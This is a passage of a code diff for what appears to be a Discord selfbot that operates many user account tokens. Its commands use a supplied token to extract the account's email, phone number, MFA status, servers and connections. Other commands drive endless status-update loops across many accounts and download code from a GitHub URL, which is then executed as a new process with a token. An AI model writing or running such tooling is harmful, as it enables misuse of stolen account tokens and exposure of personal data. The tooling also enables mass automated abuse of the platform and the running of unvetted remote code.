+                        await status_msg.edit(content=progress)
+                        await asyncio.sleep(0.5)
+                except Exception as e:
+                    await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+                    return
+
+        await status_msg.edit(content=f"""```ansi
+{theme_primary}Status Reset Complete{reset}
+Successfully reset: {success}/{len(selected_tokens)} statuses```""")
+
+    except asyncio.TimeoutError:
+        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
+    except Exception as e:
+        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+
+@bot.command()
+async def tinfo(ctx, token_input: str):
+    """Get token account information"""
+    tokens = load_tokens()
+    
+    try:
+        index = int(token_input) - 1
+        if 0 <= index < len(tokens):
+            token = tokens[index]
+        else:
+            await ctx.send(f"```{theme_primary}Invalid token number{reset}```")
+            return
+    except ValueError:
+        token = token_input
+        if token not in tokens:
+            await ctx.send(f"```{theme_primary}Invalid token{reset}```")
+            return
+
+    status_msg = await ctx.send(f"```{theme_primary}Fetching token information...{reset}```")
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                'https://discord.com/api/v9/users/@me',
+                headers={
+                    'Authorization': token,
+                    'Content-Type': 'application/json'
+                }
+            ) as resp:
+                if resp.status != 200:
+                    await status_msg.edit(content=f"```{theme_primary}Failed to fetch token information{reset}```")
+                    return
+                
+                user_data = await resp.json()
+                
+                async with session.get(
+                    'https://discord.com/api/v9/users/@me/connections',
+                    headers={
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    }
+                ) as conn_resp:
+                    connections = await conn_resp.json() if conn_resp.status == 200 else []
+
+                async with session.get(
+                    'https://discord.com/api/v9/users/@me/guilds',
+                    headers={
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    }
+                ) as guild_resp:
+                    guilds = await guild_resp.json() if guild_resp.status == 200 else []
+
+                created_at = datetime.fromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000)
+                created_date = created_at.strftime('%Y-%m-%d %H:%M:%S')
+
+                info = f"""```ansi
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+                                {theme_primary}Token Account Information{reset}
+
+                                {theme_secondary}Basic Information:{reset}
+                                Username: {user_data['username']}#{user_data['discriminator']}
+                                ID: {user_data['id']}
+                                Email: {user_data.get('email', 'Not available')}
+                                Phone: {user_data.get('phone', 'Not available')}
+                                Created: {created_date}
+                                Verified: {user_data.get('verified', False)}
+                                MFA Enabled: {user_data.get('mfa_enabled', False)}
+
+                                {theme_secondary}Nitro Status:{reset}
+                                Premium: {bool(user_data.get('premium_type', 0))}
+                                Type: {['None', 'Classic', 'Full'][user_data.get('premium_type', 0)]}
+
+                                {theme_secondary}Stats:{reset}
+                                Servers: {len(guilds)}
+                                Connections: {len(connections)}
+
+                                {theme_secondary}Profile:{reset}
+                                Bio: {user_data.get('bio', 'No bio set')}
+                                Banner: {'Yes' if user_data.get('banner') else 'No'}
+                                Avatar: {'Yes' if user_data.get('avatar') else 'Default'}
+{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
+```"""
+
+                await status_msg.edit(content=info)
+
+    except Exception as e:
+        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+
+
+
+
+@bot.command()
+async def tstream(ctx, *, statuses_list: str = None):
+    """Multi-token streaming status rotation"""
+    tokens = load_tokens()
+    total_tokens = len(tokens)
+    
+    if not statuses_list:
+        await ctx.send(f"```{theme_primary}Please provide statuses | .tstream status1, status2, status3{reset}```")
+        return
+
+    # Parse statuses
+    statuses = [status.strip() for status in statuses_list.split(',') if status.strip()]
+    
+    if not statuses:
+        await ctx.send(f"```{theme_primary}No valid statuses provided{reset}```")
+        return
+
+    status_msg = await ctx.send(f"""```ansi
+{theme_primary}Token Streaming Status{reset}
+Total tokens available: {total_tokens}
+How many tokens do you want to use? (Type 'all' or enter a number)```""")
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    try:
+        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
+        amount = amount_msg.content.lower()
+        
+        if amount == 'all':
+            selected_tokens = tokens
+        else:
+            try:
+                num = int(amount)
+                if num > total_tokens:
+                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
+                    return
+                selected_tokens = random.sample(tokens, num)
+            except ValueError:
+                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
+                return
+
+        # Start streaming for all selected tokens
+        streaming_tasks = []
+        
+        async def token_stream_loop(token, token_index):
+            current_status_index = 0
+            success_count = 0
+            
+            while True:
+                try:
+                    status_text = statuses[current_status_index % len(statuses)]
+                    
+                    # Set streaming activity for this token
+                    headers = {
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    }
+                    
+                    # Set custom status with streaming
+                    status_data = {
+                        'custom_status': {
+                            'text': status_text
+                        }
+                    }
+                    
+                    async with aiohttp.ClientSession() as session:
+                        async with session.patch(
+                            'https://discord.com/api/v9/users/@me/settings',
+                            headers=headers,
+                            json=status_data
+                        ) as resp:
+                            if resp.status == 200:
+                                success_count += 1
+                    
+                    # Update progress for this token
+                    progress = f"""```ansi
+{theme_primary}Token Streaming Status{reset}
+Tokens: {len(selected_tokens)} | Statuses: {len(statuses)}
+Progress: Token {token_index + 1} - {current_status_index + 1}/{len(statuses)}
+Current: {status_text}
+Success: {success_count} updates
+
+{theme_secondary}Streaming rotation active...{reset}```"""
+                    
+                    await status_msg.edit(content=progress)
+                    
+                    # Rotate to next status
+                    current_status_index += 1
+                    await asyncio.sleep(8)  # Change status every 8 seconds
+                    
+                except Exception as e:
+                    print(f"Error in token {token_index} stream: {e}")
+                    await asyncio.sleep(5)
+                    continue
+
+        # Start streaming for each token
+        for i, token in enumerate(selected_tokens):
+            task = asyncio.create_task(token_stream_loop(token, i))
+            streaming_tasks.append(task)
+            await asyncio.sleep(0.5)  # Stagger token starts
+
+        # Store tasks for potential stopping
+        if not hasattr(bot, 'tstream_tasks'):
+            bot.tstream_tasks = {}
+        bot.tstream_tasks[ctx.channel.id] = streaming_tasks
+
+        await ctx.send(f"```{theme_primary}Started streaming for {len(selected_tokens)} tokens with {len(statuses)} statuses{reset}```")
+
+    except asyncio.TimeoutError:
+        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
+    except Exception as e:
+        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")
+
+@bot.command()
+async def tstreamoff(ctx):
+    """Stop all token streaming"""
+    if hasattr(bot, 'tstream_tasks') and ctx.channel.id in bot.tstream_tasks:
+        tasks = bot.tstream_tasks[ctx.channel.id]
+        for task in tasks:
+            task.cancel()
+        del bot.tstream_tasks[ctx.channel.id]
+        await ctx.send(f"```{theme_primary}Stopped all token streaming{reset}```")
+    else:
+        await ctx.send(f"```{theme_primary}No token streaming active{reset}```")
+
+@bot.command()
+async def tss(ctx):
+    """Check token streaming status"""
+    if hasattr(bot, 'tstream_tasks') and ctx.channel.id in bot.tstream_tasks:
+        tasks = bot.tstream_tasks[ctx.channel.id]
+        active_tasks = sum(1 for task in tasks if not task.done())
+        await ctx.send(f"```{theme_primary}Token Streaming Status: {active_tasks}/{len(tasks)} tokens active{reset}```")
+    else:
+        await ctx.send(f"```{theme_primary}No token streaming active{reset}```")
+@bot.command()
+async def hostton(ctx, token: str):
+    """Host a token in a separate selfbot instance"""
+    try:
+        await ctx.message.delete()
+        
+        current_dir = os.getcwd()
+        xlegacy_host_path = os.path.join(current_dir, "Xlegacy host")
+        
+        # Create directory if it doesn't exist
+        os.makedirs(xlegacy_host_path, exist_ok=True)
+        
+        config_path = os.path.join(xlegacy_host_path, "config.json")
+        
+        # First, get the username from the token to name the file
+        async def get_username(token):
+            headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'
+            }
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(
+                        'https://discord.com/api/v9/users/@me',
+                        headers=headers
+                    ) as resp:
+                        if resp.status == 200:
+                            user_data = await resp.json()
+                            return user_data['username']
+                        else:
+                            return "unknown"
+            except:
+                return "unknown"
+        
+        # Get username for the file name
+        username = await get_username(token)
+        safe_username = "".join(c for c in username if c.isalnum() or c in (' ', '-', '_')).rstrip()
+        if not safe_username:
+            safe_username = "hosted_bot"
+        
+        bot_file_path = os.path.join(xlegacy_host_path, f"{safe_username}.py")
+        
+        # Create config file
+        config = {"token": token}
+        with open(config_path, 'w', encoding='utf-8') as f:  # Added encoding
+            json.dump(config, f, indent=4)
+        
+        # Load bot code from GitHub instead of hardcoding
+        async def download_bot_code():
+            github_url = "https://raw.githubusercontent.com/jayden-so/Xlegacy-client/refs/heads/main/main.py"
+            async with aiohttp.ClientSession() as session:
+                async with session.get(github_url) as response:
+                    if response.status == 200:
+                        content = await response.text()
+                        # Clean any problematic characters
+                        content = content.encode('utf-8', 'ignore').decode('utf-8')
+                        return content
+                    else:
+                        raise Exception(f"Failed to download code from GitHub: {response.status}")
+        
+        # Download the bot code from GitHub
+        bot_code = await download_bot_code()
+        
+        # Write the bot file with UTF-8 encoding
+        with open(bot_file_path, 'w', encoding='utf-8') as f:  # Added encoding here
+            f.write(bot_code)
+        
+        # Change to host directory and start
+        os.chdir(xlegacy_host_path)
+        
+        if os.name == 'nt':  # Windows
+            subprocess.Popen(["python", f"{safe_username}.py"], 
+                            cwd=xlegacy_host_path,
+                            creationflags=subprocess.CREATE_NEW_CONSOLE)
+        else:  # Linux/Mac
+            subprocess.Popen(["python3", f"{safe_username}.py"], 
+                            cwd=xlegacy_host_path)
+        
+        # Return to original directory
+        os.chdir(current_dir)
+        
+        await ctx.send(f"```{theme_primary}Successfully started host for user: {username}{reset}```", delete_after=5)
+        await ctx.send(f"```{theme_primary}Created in: Xlegacy host/{safe_username}.py{reset}```", delete_after=5)
+        await ctx.send(f"```{theme_primary}Code loaded from GitHub{reset}```", delete_after=5)
+        
+    except Exception as e:
+        await ctx.send(f"```{theme_primary}Error: {str(e)}{reset}```", delete_after=5)
+
+import json
+
+# Read token from config.json
+with open('config.json', 'r') as config_file:
+    config = json.load(config_file)
+    token = config['TOKEN']
+
+# Use the token
+bot.run(token, bot=False)  
